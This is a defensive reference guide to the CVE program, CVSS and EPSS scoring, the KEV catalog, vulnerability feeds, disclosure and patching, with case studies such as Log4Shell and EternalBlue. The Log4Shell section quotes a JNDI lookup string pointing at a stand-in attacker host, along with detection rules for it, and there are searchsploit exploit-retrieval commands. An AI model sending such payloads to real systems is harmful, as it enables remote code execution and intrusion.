# CVE Reference Guide

> Comprehensive reference for CVE program, CVSS scoring, EPSS, KEV catalog,
> vulnerability databases, research, patch management, notable CVEs, and automation tooling.

---

## Table of Contents
1. [CVE Program & NVD Architecture](#s1)
2. [CVSS v3.1 Deep Dive](#s2)
3. [CVSS v4.0](#s3)
4. [EPSS -- Exploit Prediction Scoring System](#s4)
5. [CISA KEV Catalog](#s5)
6. [Vulnerability Databases & Feeds](#s6)
7. [Vulnerability Research & Disclosure](#s7)
8. [Patch Management & Remediation](#s8)
9. [Notable CVEs & Case Studies](#s9)
10. [CVE Automation & Tooling](#s10)

---

## 1. CVE Program & NVD Architecture {#s1}

### History & Scale
The Common Vulnerabilities and Exposures (CVE) program was established in 1999
by MITRE Corporation with initial funding from DARPA/NSF, now operated under
CISA. The initial list had 321 entries; as of 2024 the program has published
over **240,000+ CVE records** growing at ~25,000-30,000 new CVEs per year.
CVE provides a standardized identifier allowing security tools, databases, and
researchers to reference the same vulnerability unambiguously.

### CNA Hierarchy
The CVE Numbering Authority (CNA) ecosystem is a federated hierarchy:

**MITRE (Root CNA)** -- ultimate authority; assigns CVEs when no other CNA
covers the scope; operates cve.mitre.org and the CVE Services API.

**Top-Level Root CNAs (TL-Root):**
- CISA-ADP -- U.S. government systems; Authorized Data Publisher for SSVC enrichment
- GitHub -- GitHub-hosted open source projects and ecosystems
- Microsoft -- all Microsoft products, Azure, Microsoft 365
- Google -- Google/Alphabet products, Android, ChromeOS, Chrome
- Red Hat -- RHEL, Fedora, CentOS Stream, OpenShift
- Apple -- macOS, iOS, iPadOS, watchOS, tvOS, Safari, XNU kernel
- Oracle -- Oracle Database, Java SE/JDK, MySQL, WebLogic
- Cisco -- Cisco IOS, NX-OS, ASA, network hardware, Webex

**CNA-LR (CNA of Last Resort)** -- MITRE fills gaps for products outside any
CNA scope: novel products, independent researchers, EOL software.

**Authorized Data Publishers (ADP)** -- not CNAs; authorized to add enrichment
to existing CVE records. CISA-ADP adds SSVC decision-point data and
exploitation status; other ADPs add CPE/CVSS data.

### CVE ID Format
- Pre-2014: CVE-YYYY-NNNN (4-digit, max 9,999/year)
- 2014+: CVE-YYYY-NNNNN+ (5+ digits, no upper limit)
- Examples: CVE-2014-0160 (Heartbleed), CVE-2021-44228 (Log4Shell),
  CVE-2023-34362 (MOVEit)

### CVE JSON 5.0 Record Schema

    {
      "dataType": "CVE_RECORD",
      "dataVersion": "5.0",
      "cveMetadata": {
        "cveId": "CVE-2021-44228",
        "assignerOrgId": "48a46321-0116-415e-a4a0-7728ba3167d3",
        "state": "PUBLISHED",
        "datePublished": "2021-12-10T00:00:00",
        "dateReserved": "2021-11-26T00:00:00"
      },
      "containers": {
        "cna": {
          "descriptions": [{"lang":"en","value":"Apache Log4j2 2.0-beta9..."}],
          "affected": [{
            "vendor": "Apache Software Foundation",
            "product": "Apache Log4j2",
            "versions": [{"version":"2.0-beta9","lessThan":"2.15.0",
                          "status":"affected","versionType":"semver"}]
          }],
          "metrics": [{"cvssV3_1":{"vectorString":
            "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H","baseScore":10.0}}],
          "solutions": [{"lang":"en","value":"Upgrade to Log4j 2.15.0+"}],
          "credits": [{"lang":"en","value":"Chen Zhaojun, Alibaba Cloud Security"}]
        },
        "adp": [{
          "providerMetadata": {"shortName": "CISA-ADP"},
          "metrics": [{"other":{"type":"ssvc","content":{
            "exploitation":"active","automatable":"yes"}}}]
        }]
      }
    }

### CVE States
- **RESERVED** -- ID assigned; details embargoed while patch is developed
- **PUBLISHED** -- full details public in NVD/CVE.org (description, versions, CVSS)
- **REJECTED** -- duplicate or erroneous; record retained with rejection note

### NVD Enrichment Pipeline
NVD (nvd.nist.gov) independently adds to each published CVE record:
1. CVSS Scoring -- v2.0, v3.1, and increasingly v4.0 base scores
2. CPE Matching -- e.g. `cpe:2.3:a:apache:log4j:2.14.1:*:*:*:*:*:*:*`
3. CWE Mapping -- weakness taxonomy classification
4. Keyword Indexing -- full-text search
5. ADP Enrichment -- CISA-ADP SSVC data (exploitation/automatable/technicalImpact)

### CNA Workflow & Disclosure Timelines
1. Researcher finds bug, contacts vendor (security@vendor.com or bug bounty platform)
2. CNA reserves CVE ID (state: RESERVED)
3. Vendor develops + tests patch (typically 60-120 days)
4. Coordinated disclosure: patch + CVE published simultaneously
5. CVE record updated with full technical details

| Organization | Default Window | Notes |
|---|---|---|
| Google Project Zero | 90 days | +14-day grace if patch imminent |
| ZDI | 120 days | Pays at acquisition |
| CERT/CC | 45 days | Flexible for multi-vendor |
| ISO/IEC 29147 | 90 days | Mutual agreement allowed |

---

## 2. CVSS v3.1 Deep Dive {#s2}

### Base Metric Weights

| Metric | Value | Weight |
|--------|-------|--------|
| Attack Vector | Network | 0.85 |
| | Adjacent | 0.62 |
| | Local | 0.55 |
| | Physical | 0.20 |
| Attack Complexity | Low | 0.77 |
| | High | 0.44 |
| Privileges Required | None | 0.85 |
| | Low (S:U) | 0.62 |
| | Low (S:C) | 0.50 |
| | High (S:U) | 0.27 |
| | High (S:C) | 0.50 |
| User Interaction | None | 0.85 |
| | Required | 0.62 |
| CIA Impact | None | 0.00 |
| | Low | 0.22 |
| | High | 0.56 |

**Scope (S):**
- Unchanged (U): exploited and impacted component are the same
- Changed (C): exploitation causes impact on a different component/authority
  (VM escape, browser sandbox escape, SSRF to metadata service)

### CVSS v3.1 Base Score Formula

    ISS = 1 - [(1-C_I) * (1-I_I) * (1-A_I)]

    If Scope=Unchanged:  Impact = 6.42 * ISS
    If Scope=Changed:    Impact = 7.52*[ISS-0.029] - 3.25*[ISS-0.02]^15

    Exploitability = 8.22 * AV * AC * PR * UI

    BaseScore = 0.0                           if Impact <= 0
    BaseScore = Roundup(Min(Impact+Exploit,10)) otherwise

    Roundup: round to 1 decimal, always round up (9.31 -> 9.4)

### Temporal Metrics (modify base score downward)

    TemporalScore = Roundup(BaseScore * E * RL * RC)

**Exploit Code Maturity (E):**
- Not Defined (X): 1.00 | Unproven (U): 0.91 | Proof-of-Concept (P): 0.94
- Functional (F): 0.97 | High (H): 1.00

**Remediation Level (RL):**
- Not Defined (X): 1.00 | Official Fix (O): 0.95 | Temporary Fix (T): 0.96
- Workaround (W): 0.97 | Unavailable (U): 1.00

**Report Confidence (RC):**
- Not Defined (X): 1.00 | Unknown (U): 0.92 | Reasonable (R): 0.96
- Confirmed (C): 1.00

### Environmental Metrics
Modified Base Metrics (MAV, MAC, MPR, MUI, MS, MC, MI, MA) override base values
for local environment context; default "Not Defined" inherits base value.

CR/IR/AR (Requirement modifiers): Low 0.50 | Medium 1.00 | High 1.50

### Worked Example: CVE-2021-44228 Log4Shell

    AV:N  -- network-exploitable via any HTTP/TCP connection
    AC:L  -- no special conditions; exploit is deterministic
    PR:N  -- unauthenticated; attacker controls any logged string
    UI:N  -- no victim action; server processes requests automatically
    S:C   -- JNDI loads attacker class in JVM; scope change
    C:H   -- RCE = complete confidentiality loss
    I:H   -- RCE = arbitrary writes/modification
    A:H   -- RCE = service disruption

    Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H
    Base Score: 10.0 CRITICAL

### Severity Ranges

| Severity | Score Range | Typical SLA |
|----------|-------------|-------------|
| None | 0.0 | N/A |
| Low | 0.1 - 3.9 | 180 days |
| Medium | 4.0 - 6.9 | 90 days |
| High | 7.0 - 8.9 | 30 days |
| Critical | 9.0 - 10.0 | 14 days |

---

## 3. CVSS v4.0 {#s3}

Released by FIRST, October 2023. Significant structural changes from v3.1.

### Score Nomenclature

| Label | Components | Use Case |
|-------|-----------|---------|
| CVSS-B | Base only | Vendor advisories |
| CVSS-BT | Base + Threat | Current exploitation state |
| CVSS-BE | Base + Environmental | Org-specific risk |
| CVSS-BTE | Base + Threat + Environmental | Full current org risk |

### New and Changed Base Metrics

**Attack Requirements (AT)** -- NEW: environmental prerequisites beyond attacker control
- None (N): no special deployment conditions required
- Present (P): specific config/deployment condition required

**User Interaction (UI)** -- Expanded from binary:
- None (N): no user involvement
- Passive (P): user takes routine action (opens email, visits page)
- Active (A): user must take deliberate non-routine action (open file, install package)

**Scope removed** -- Replaced by two-system impact model:

| Metric | Description |
|--------|-------------|
| VC/VI/VA | Vulnerable System CIA (directly exploited) |
| SC/SI/SA | Subsequent System CIA (other systems affected) |

Each: None / Low / High

### Supplemental Metrics (informational only -- do not affect score)

| Metric | Values | Purpose |
|--------|--------|---------|
| Safety (S) | Not Defined / Negligible / Present | Life/physical safety (OT/ICS) |
| Automatable (AU) | No / Yes | Wormability check |
| Recovery (R) | Automatic / User / Irrecoverable | Post-exploit recovery |
| Value Density (V) | Diffuse / Concentrated | Resource richness of target |
| Response Effort (RE) | Low / Moderate / High | Defender effort to remediate |
| Provider Urgency (U) | Red / Amber / Green / Clear | Vendor urgency signal |

### Threat Metric (replaces Temporal E)
- Not Defined (X): 1.00 | Unreported (U): 0.91
- Proof-of-Concept (P): 0.94 | Attacked (A): 1.00

### v3.1 vs v4.0 Comparison

| Dimension | v3.1 | v4.0 |
|-----------|------|------|
| Scope metric | Changed/Unchanged | Removed |
| Impact model | Single system | VS + SS two-system |
| OT/ICS | Limited | Safety supplemental |
| UI values | None/Required | None/Passive/Active |
| Exploit metric | Exploit Code Maturity | Threat |
| Comparability | N/A | NOT comparable to v3.1 |

Calculator: https://www.first.org/cvss/calculator/4-0

### CVSS v4.0 Example: CVE-2023-4966 CitrixBleed

    AV:N / AC:L / AT:N / PR:N / UI:N
    VC:H / VI:N / VA:N          (session tokens leaked from NetScaler memory)
    SC:H / SI:H / SA:N          (full access to downstream authenticated systems)
    CVSS-B: 9.4 CRITICAL
    Vector: CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:N/VA:N/SC:H/SI:H/SA:N

---

## 4. EPSS -- Exploit Prediction Scoring System {#s4}

### What EPSS Measures
EPSS (maintained by FIRST) answers: **"What is the probability this CVE will
be exploited in the wild in the next 30 days?"**

- Score: 0.000001 to 1.0 (probability)
- Updated **daily** at api.first.org
- EPSS v3 (current, Feb 2023): ~1,500 features, best accuracy to date

### EPSS v3 Model Features
- NVD metadata: CVSS score, CWE, CPE vendor/product
- Reference patterns: exploit-db.com URL = strong positive signal
- Exploit-DB listing and Metasploit module existence
- Social media velocity: Twitter/X, Reddit, security blogs
- Dark web signals: exploit marketplace listings
- Threat intelligence: honeypot exploitation data
- CVE age and patch availability

### API Usage

    # Single CVE
    curl "https://api.first.org/data/v1/epss?cve=CVE-2021-44228"
    # Response: {"data":[{"cve":"CVE-2021-44228","epss":"0.97565","percentile":"0.99998"}]}

    # Bulk (up to 100 CVEs)
    curl "https://api.first.org/data/v1/epss?cve=CVE-2021-44228,CVE-2023-34362"

    # Filter: all CVEs with EPSS > 0.70 today
    curl "https://api.first.org/data/v1/epss?epss-gt=0.70&order=!epss&limit=100"

Python bulk query:

    import requests
    def get_epss(cve_list):
        out = {}
        for i in range(0, len(cve_list), 100):
            batch = ",".join(cve_list[i:i+100])
            r = requests.get(f"https://api.first.org/data/v1/epss?cve={batch}")
            for e in r.json().get("data", []):
                out[e["cve"]] = {"epss": float(e["epss"]),
                                 "pct": float(e["percentile"])}
        return out

### Score Interpretation

Only **5-7% of all published CVEs** are ever exploited. EPSS identifies which.

| EPSS Score | Interpretation | Action |
|------------|---------------|----|
| > 0.70 | Top ~3%; very high probability | Emergency (24-72h) |
| 0.10-0.70 | Top 20-30%; elevated risk | Accelerate (14 days) |
| 0.01-0.10 | Moderate baseline | Normal cycle |
| < 0.01 | Low (majority of CVEs) | Deprioritize |

### EPSS + CVSS Combined Matrix

| CVSS | EPSS > 0.70 | EPSS 0.10-0.70 | EPSS < 0.10 |
|------|-------------|----------------|-------------|
| Critical/High | Emergency 24-72h | High: 14 days | Normal: 30 days |
| Medium | High: 14 days | Normal: 60 days | Low: 90 days |
| Low | Monitor | Deprioritize | Deprioritize |

### EPSS Limitations
- New CVEs lack exploitation history; may underestimate targeted 0-days
- Novel attack classes not in training data are underweighted
- Nation-state targeting of specific organizations not captured
- Population-level metric; does not account for your asset exposure
- v1/v2/v3 scores are not directly comparable across model versions

---

## 5. CISA KEV Catalog {#s5}

### Legal Authority
**BOD 22-01** (November 3, 2021): Federal Civilian Executive Branch (FCEB)
agencies must remediate KEV entries within deadlines set per entry (typically
14 days). CISA recommends all organizations use KEV for prioritization.

### KEV Entry Criteria
ALL THREE must be met for a CVE to enter KEV:
1. Valid CVE ID assigned
2. Reliable evidence of active exploitation in the wild (not just PoC)
3. Clear remediation guidance available (vendor patch or official mitigation)

### KEV JSON Feed

    # Download (updated daily)
    curl -O https://www.cisa.gov/sites/default/files/feeds/known_exploited_vulnerabilities.json

Feed structure:

    {
      "title": "CISA Known Exploited Vulnerabilities Catalog",
      "catalogVersion": "2024.01.15",
      "count": 1112,
      "vulnerabilities": [
        {
          "cveID": "CVE-2021-44228",
          "vendorProject": "Apache",
          "product": "Log4j2",
          "vulnerabilityName": "Apache Log4j2 Remote Code Execution Vulnerability",
          "dateAdded": "2021-12-10",
          "requiredAction": "Apply updates per vendor instructions.",
          "dueDate": "2021-12-24",
          "knownRansomwareUse": "Known"
        }
      ]
    }

### Python KEV Parser

    import requests
    from collections import Counter
    from datetime import datetime, timedelta

    def kev_check(asset_cves: set) -> list:
        data = requests.get(
            "https://www.cisa.gov/sites/default/files/feeds/known_exploited_vulnerabilities.json"
        ).json()
        vulns = data["vulnerabilities"]

        # Stats
        print(f"Total KEV: {len(vulns)}")
        print(f"Ransomware-associated: {sum(1 for v in vulns if v.get('knownRansomwareUse')=='Known')}")
        vendors = Counter(v["vendorProject"] for v in vulns)
        print("Top vendors:", vendors.most_common(5))

        # Cross-reference with asset CVEs
        matches = [v for v in vulns if v["cveID"] in asset_cves]
        for m in matches:
            print(f"EMERGENCY: {m['cveID']} due {m['dueDate']} | {m['requiredAction']}")
        return matches

### KEV Catalog Statistics (2024)
- Total entries: ~1,100+ (growing ~15-20/month)
- Top vendors: Microsoft, Cisco, Apple, Google, Adobe, Ivanti, Fortinet, VMware
- Ransomware-associated: ~30% of all entries
- Oldest entries: early 2000s legacy CVEs still actively exploited

### Prioritization Tier Model
1. CISA KEV -- confirmed exploitation; mandatory for FCEB (14-day SLA)
2. EPSS > 0.70 -- very likely to be exploited; treat as pre-KEV
3. CVSS Critical (9.0+) -- high theoretical impact
4. CVSS High (7.0-8.9) -- significant impact
5. Medium/Low -- standard cycle

---

## 6. Vulnerability Databases & Feeds {#s6}

### NVD REST API v2.0

Base URL: `https://services.nvd.nist.gov/rest/json/cves/2.0`

    # Single CVE lookup
    curl "https://services.nvd.nist.gov/rest/json/cves/2.0?cveId=CVE-2021-44228"

    # Incremental sync (last 24h modifications)
    curl "...?lastModStartDate=2024-01-01T00:00:00.000&lastModEndDate=2024-01-02T00:00:00.000"

    # Filter by severity
    curl "...?cvssV3Severity=CRITICAL&resultsPerPage=100"

    # CPE-based product search
    curl "...?cpeName=cpe:2.3:a:apache:log4j:2.14.1:*:*:*:*:*:*:*"

    # Pagination (max 2,000/page)
    curl "...?cvssV3Severity=CRITICAL&startIndex=200&resultsPerPage=100"

Rate limits: 6 req/30s without API key; higher with free key from nvd.nist.gov/developers.

Python sync client (abbreviated):

    import requests, time, sqlite3, json
    from datetime import datetime, timedelta

    class NVDClient:
        BASE = "https://services.nvd.nist.gov/rest/json/cves/2.0"
        def __init__(self, api_key=None):
            self.headers = {"apiKey": api_key} if api_key else {}
            self.delay = 0.6 if api_key else 6.0
        def _get(self, params):
            time.sleep(self.delay)
            return requests.get(self.BASE, params=params,
                                headers=self.headers, timeout=30).json()
        def sync_range(self, start, end):
            params = {"lastModStartDate": start.strftime("%Y-%m-%dT%H:%M:%S.000"),
                      "lastModEndDate":   end.strftime("%Y-%m-%dT%H:%M:%S.000"),
                      "resultsPerPage": 2000}
            count = 0
            while True:
                params["startIndex"] = count
                data = self._get(params)
                vulns = data.get("vulnerabilities", [])
                count += len(vulns)
                if count >= data.get("totalResults", 0):
                    break
            return count

### OSV (osv.dev)
Open source focused; git-commit-level affected version ranges.

OSV JSON key fields:

    {
      "id": "GHSA-jfh8-c2jp-hdp8",
      "aliases": ["CVE-2022-31197"],
      "affected": [{
        "package": {"ecosystem": "Maven", "name": "org.postgresql:postgresql"},
        "ranges": [
          {"type": "ECOSYSTEM", "events": [{"introduced":"42.2.0"},{"fixed":"42.2.26"}]},
          {"type": "GIT", "repo": "https://github.com/pgjdbc/pgjdbc",
           "events": [{"introduced":"badc9814"},{"fixed":"739e599d"}]}
        ]
      }]
    }

OSV Scanner CLI:

    osv-scanner --lockfile=package-lock.json --json
    osv-scanner -r /path/to/project --json
    osv-scanner --sbom=sbom.cdx.json --json
    osv-scanner --docker nginx:latest

Supported ecosystems: Go, npm, PyPI, crates.io, RubyGems, NuGet, Maven,
Packagist, Hex, Pub, Alpine, Debian, Ubuntu, Rocky Linux

### GitHub Security Advisories (GHSA)
Format: GHSA-xxxx-xxxx-xxxx. Powers Dependabot; ecosystem-native version ranges.

GraphQL:

    query {
      securityAdvisory(ghsaId: "GHSA-jfh8-c2jp-hdp8") {
        severity
        cvss { score vectorString }
        cwes(first:5) { nodes { cweId name } }
        vulnerabilities(first:10) {
          nodes {
            package { name ecosystem }
            vulnerableVersionRange
            firstPatchedVersion { identifier }
          }
        }
      }
    }

### Exploit-DB / searchsploit

    searchsploit apache 2.4               # Search by product/version
    searchsploit --id CVE-2021-41773      # Search by CVE ID
    searchsploit -m 50383                 # Copy exploit to current dir
    searchsploit --nmap scan.xml          # Check Nmap output against Exploit-DB
    searchsploit -u                       # Update local database

### CWE Top 25 Most Dangerous (2023)

| Rank | CWE-ID | Name |
|------|--------|------|
| 1 | CWE-787 | Out-of-bounds Write |
| 2 | CWE-79 | Cross-site Scripting (XSS) |
| 3 | CWE-89 | SQL Injection |
| 4 | CWE-416 | Use After Free |
| 5 | CWE-78 | OS Command Injection |
| 6 | CWE-20 | Improper Input Validation |
| 7 | CWE-125 | Out-of-bounds Read |
| 8 | CWE-22 | Path Traversal |
| 9 | CWE-352 | CSRF |
| 10 | CWE-434 | Unrestricted File Upload |
| 11 | CWE-502 | Deserialization of Untrusted Data |
| 12 | CWE-306 | Missing Authentication |
| 13 | CWE-190 | Integer Overflow |
| 14 | CWE-476 | NULL Pointer Dereference |
| 15 | CWE-798 | Hard-coded Credentials |

### Vendor Advisory Feeds

    # Microsoft MSRC (Patch Tuesday -- 2nd Tuesday monthly)
    curl "https://api.msrc.microsoft.com/cvrf/v2.0/updates"
    curl "https://api.msrc.microsoft.com/cvrf/v2.0/cvrf/id/2024-Jan"

    # Red Hat OVAL (automated patch status)
    curl -O https://www.redhat.com/security/data/oval/com.redhat.rhsa-RHEL9.xml.bz2
    bunzip2 com.redhat.rhsa-RHEL9.xml.bz2
    oscap oval eval --results results.xml com.redhat.rhsa-RHEL9.xml

    # Cisco PSIRT RSS
    curl "https://tools.cisco.com/security/center/rss.xml"

---

## 7. Vulnerability Research & Disclosure {#s7}

### Finding Vulnerabilities

**Fuzzing:**

    # AFL++ -- coverage-guided greybox fuzzer
    afl-fuzz -i corpus/ -o findings/ -- ./target @@
    # @@: replaced with mutated input file path
    # Persistent mode: use __AFL_LOOP() macro + afl-clang-fast (100x faster)

    # libFuzzer -- compiler-integrated (for library functions)
    clang -g -O1 -fsanitize=fuzzer,address -o fuzz_target fuzz_target.c
    ./fuzz_target -max_total_time=3600 -jobs=4 corpus/

    # OSS-Fuzz: Google's continuous fuzzing for 1000+ open source projects
    # Submit via https://github.com/google/oss-fuzz for free 24/7 fuzzing

**Static Analysis / CodeQL:**

    # Create database
    codeql database create mydb --language=javascript --source-root=./src

    # Run security queries
    codeql database analyze mydb codeql/javascript-queries:Security/       --format=sarif-latest --output=results.sarif

**Memory Safety Sanitizers:**

    clang -fsanitize=address,undefined -g -O1 -o target target.c
    # ASan: buffer overflows, use-after-free, double-free
    # UBSan: integer overflow, null pointer dereference, misaligned access

    clang -fsanitize=memory -g -O1 -o target target.c
    # MSan: uninitialized reads

    valgrind --leak-check=full --track-origins=yes ./target  # no recompile needed

**Patch Diffing (N-day research):**

    # Open source: find security commits
    git log --oneline --no-merges -- '*.c' | grep -i "fix\|vuln\|secur"
    git diff VULN_COMMIT..PATCH_COMMIT

    # Binary: BinDiff (Ghidra/IDA plugin)
    # Export BinExport from old+new binary -> compare in BinDiff

### Responsible Disclosure

**Find vendor contact:**

    curl https://target.com/.well-known/security.txt  # RFC 9116 standard
    # Try: security@, psirt@, vulnerability@vendor.com
    # Check HackerOne/Bugcrowd program directories

**Disclosure timelines:**

| Organization | Window | Notes |
|---|---|---|
| Google Project Zero | 90 days | +14-day grace |
| ZDI | 120 days | Pays bounty at acquisition |
| CERT/CC | 45 days | Multi-vendor coordination |
| ISO/IEC 29147 | 90 days | International standard |

**If vendor unresponsive:**
1. Day 7: Follow-up same thread
2. Day 14: Notify escalation to CERT/CC
3. Day 21: Contact kb.cert.org/vuls/report/
4. Day 90: Publish (notify vendor 7 days before)

### Vulnerability Report Template

    Title: [Vendor] [Product] [Version] -- [CWE Class] enabling [Impact]

    CVSS v3.1: X.X [SEVERITY]
    Vector: CVSS:3.1/AV:.../...
    CWE: CWE-XXX ([Name])

    Summary: [2-3 sentences: what/where/impact]

    Proof of Concept:
    $ curl -X POST https://target/endpoint -d "param=PAYLOAD"
    Expected: [normal behavior]
    Actual: [vulnerable behavior]

    Affected: [version range; tested version]
    Environment: [OS, software versions]

    Timeline:
    YYYY-MM-DD -- Discovered
    YYYY-MM-DD -- Reported to vendor
    YYYY-MM-DD -- CVE-YYYY-NNNNN assigned
    YYYY-MM-DD -- Patch released (version X.Y.Z)

    Remediation: [upgrade to X.Y.Z / apply patch MSYY-XXXX]

### Bug Bounty Programs (2024)

| Program | Platform | Max Award |
|---------|----------|-----------|
| Apple Security | Direct | $1,000,000 (kernel/boot) |
| Microsoft MSRC | Direct/HackerOne | $250,000 |
| Google VRP | Direct | $150,000+ |
| Meta | HackerOne | $300,000 |
| GitHub | HackerOne | $50,000 |

Platforms: HackerOne, Bugcrowd, Intigriti, Synack (invite-only), YesWeHack

---

## 8. Patch Management & Remediation {#s8}

### Scanner Output

**Tenable Nessus:**
- Plugin ID: unique check identifier
- CVSS: NVD-sourced base score
- VPR (Vulnerability Priority Rating): 0-10; combines CVSS + threat intel + asset criticality
  - VPR >= 9: patch within 24h; VPR 7-9: 7 days; VPR < 4: normal cycle

**Qualys VMDR RTI Flags:**
- Active_Attacks, Wormable, No_Patch, Easy_Exploit, High_Lateral_Movement, CISA_KEV

**Open Source Scanners:**

    # Trivy
    trivy image nginx:latest --severity CRITICAL,HIGH
    trivy image nginx:latest --format sarif --output trivy.sarif

    # Grype
    grype image:nginx --fail-on high --output json > grype.json

    # OSV-Scanner
    osv-scanner --lockfile=package-lock.json --format json

### Risk-Based Prioritization Tiers

| Tier | Condition | SLA |
|------|-----------|-----|
| T1 Emergency | CISA KEV OR active exploitation | 24-72 hours |
| T2 Critical | EPSS > 0.70 OR CVSS 9.0+ with public exploit | 14 days |
| T3 High | CVSS 7.0+ with EPSS > 0.10 | 30 days |
| T4 Medium | CVSS 4.0-6.9 | 90 days |
| T5 Low | CVSS < 4.0 | 180 days |

### Exception Management

Exception request fields:
- CVE ID and vulnerability summary (CVSS/EPSS/KEV flag)
- Affected asset inventory
- Business justification (legacy system, vendor EOL, stability risk)
- Compensating controls (network segmentation, WAF rule, IDS signature, MFA)
- Residual risk assessment (Low/Medium/High)
- Risk owner (VP or above for Critical/High)
- Exception duration and expiration date
- Revalidation schedule

Approval matrix:

| Risk Level | Approver | Max Duration |
|-----------|---------|-------------|
| Critical | CISO + Executive Sponsor | 30 days |
| High | CISO or delegate | 90 days |
| Medium | Security Manager | 180 days |
| Low | Security Analyst | 365 days |

### SCAP -- Security Content Automation Protocol

- **OVAL**: XML-based check definitions; verify patch status without exploitation
- **XCCDF**: Benchmark format (DISA STIGs, CIS Benchmarks)
- **CPE**: Standardized product naming for software inventory matching

Commands:

    # OVAL evaluation
    oscap oval eval --results results.xml com.redhat.rhsa-RHEL9.xml

    # CIS Level 1 benchmark
    oscap xccdf eval       --profile xccdf_org.ssgproject.content_profile_cis       --results xccdf-results.xml --report xccdf-report.html       /usr/share/xml/scap/ssg/content/ssg-rhel9-xccdf.xml

### Patch Verification
1. Re-scan within 48h of remediation claim
2. Verify vulnerability absent from post-patch scan
3. Attach scan evidence to ticket
4. For KEV items: complete CISA attestation and submit to GRC

---

## 9. Notable CVEs & Case Studies {#s9}

### CVE-2021-44228 -- Log4Shell

**Affected**: Apache Log4j 2.x (2.0-beta9 through 2.14.1)
**CVSS**: 10.0 CRITICAL | AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H
**CWE**: CWE-502 (Deserialization) / CWE-917 (Expression Language Injection)
**Disclosed**: December 9, 2021 | **Exploited**: Within hours

**Root cause**: Log4j processed JNDI expressions (e.g., `${jndi:ldap://attacker.com/a}`)
embedded in any logged string -- HTTP User-Agent, username, API parameters.
The JNDI lookup fetched and executed an attacker-controlled Java class.

**Detection:**

    # Suricata IDS rule
    alert http any any -> any any (msg:"Log4Shell"; content:"${jndi:"; nocase; sid:2034647;)

    # Find vulnerable JARs on disk
    find / -name "log4j-core-*.jar" 2>/dev/null

    # Scan for active exploitation attempts in logs
    grep -ri '${jndi:' /var/log/

**Patch path**: 2.15.0 (partial) -> 2.16.0 (JNDI disabled by default, CVE-2021-45046 fixed) ->
2.17.0 (CVE-2021-45105 DoS fixed) -> 2.17.1 (CVE-2021-44832 config-file RCE fixed)

**Scale**: Hundreds of millions of affected systems; exploited within hours by
nation-state APTs (Hafnium, APT41), ransomware groups, and cryptominers.

---

### CVE-2017-0144 -- EternalBlue (MS17-010)

**Affected**: Windows XP through Server 2016 (SMBv1)
**CVSS v2**: 8.1 HIGH (practical severity ~10.0; wormable)
**CWE**: CWE-119 (Improper Memory Restriction)
**Origin**: NSA ETERNALBLUE leaked by Shadow Brokers, April 14, 2017
**Patched**: March 14, 2017 (MS17-010) -- one month before leak

**Root cause**: Buffer overflow in Windows SMBv1 server (srv.sys) transaction
handling. Unauthenticated SYSTEM-level RCE via TCP/445. Wormable.

**Aftermath:**
- WannaCry (May 2017): 200,000+ systems, 150 countries, $4-8B damage, NHS offline
- NotPetya (June 2017): $10B+ damage, Maersk/Merck/FedEx devastated; GRU Sandworm

**Commands:**

    nmap -p 445 --script smb-vuln-ms17-010 <target>

    # Disable SMBv1
    Set-SmbServerConfiguration -EnableSMB1Protocol $false -Force

---

### CVE-2023-34362 -- MOVEit Transfer SQL Injection

**Affected**: Progress MOVEit Transfer (all versions, pre-June 2023 patches)
**CVSS**: 9.8 CRITICAL | AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
**CWE**: CWE-89 (SQL Injection)
**Exploited by**: Cl0p (TA505) ransomware group, May-June 2023 as 0-day

**Technical**: SQL injection via HTTP POST to /human.aspx. Cl0p deployed
LEMURLOOT webshell, exfiltrated all stored files. No authentication required.

**Impact**: 2,500+ organizations -- US DOE/USDA, PBI Research (900,000 SSA records),
Zellis UK payroll (BBC/BA/Boots), universities, government agencies.

**Lesson**: Silent 0-day exploitation for ~4 weeks before vendor awareness.
Pure data-theft extortion model (no encryption). Supply chain via file transfer infrastructure.

---

### CVE-2014-0160 -- Heartbleed

**Affected**: OpenSSL 1.0.1 through 1.0.1f, 1.0.2-beta
**CVSS v2**: 5.0 MEDIUM (severely understated impact)
**CWE**: CWE-125 (Out-of-bounds Read)
**Disclosed**: April 7, 2014 | **Exposure window**: 2 years (since OpenSSL 1.0.1, March 2012)

**Technical**: TLS heartbeat extension (RFC 6520) allowed arbitrary memory reads
of up to 64KB per request by specifying a payload length larger than the actual
payload. No authentication, no log trace.

**Exposed**: Server private TLS keys (enables passive decryption of all traffic),
session tokens, cleartext passwords of active users.

**Scale**: ~17-25% of global HTTPS servers affected; required emergency mass
certificate revocation and reissuance.

---

### CVE-2020-1472 -- ZeroLogon

**Affected**: Windows Server (Netlogon / MS-NRPC)
**CVSS**: 10.0 CRITICAL | AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H
**CWE**: CWE-330 (Use of Insufficiently Random Values)
**Discovered**: Tom Tervoort, Secura, August 2020

**Technical**: Netlogon AES-CFB8 session key establishment with all-zero IV.
AES-CFB8 with zero IV has 1/256 probability of producing all-zero ciphertext
from zero plaintext. ~256 attempts achieve authentication as any machine account
(including domain controller) without knowing credentials. Full domain admin in ~3 seconds.

**Patch timeline**: Phase 1 (Aug 2020): optional enforcement; Phase 2 (Feb 2021):
mandatory. Microsoft delayed 6 months for legacy device compatibility.

---

### CVE-2023-4966 -- CitrixBleed

**Affected**: Citrix NetScaler ADC and Gateway
**CVSS**: 9.4 CRITICAL | AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N
**CWE**: CWE-125 (Out-of-bounds Read)
**Exploited**: 0-day before patch; mass exploitation November 2023

**Technical**: Buffer over-read in NetScaler HTTP header processing leaked valid
session tokens from memory. Unauthenticated attackers bypassed authentication
AND MFA by replaying stolen tokens. No interception of traffic required.

**Notable**: LockBit 3.0 affiliate exploited CitrixBleed in Boeing breach (Nov 2023,
~45GB exfiltrated). Thousands of appliances remained unpatched weeks after the
Oct 10, 2023 patch release due to slow enterprise edge infrastructure patching.

---

## 10. CVE Automation & Tooling {#s10}

### NVD API Python Client with SQLite Cache

    import requests, time, sqlite3, json
    from datetime import datetime, timedelta

    class NVDClient:
        BASE = "https://services.nvd.nist.gov/rest/json/cves/2.0"

        def __init__(self, api_key=None, db_path="nvd.db"):
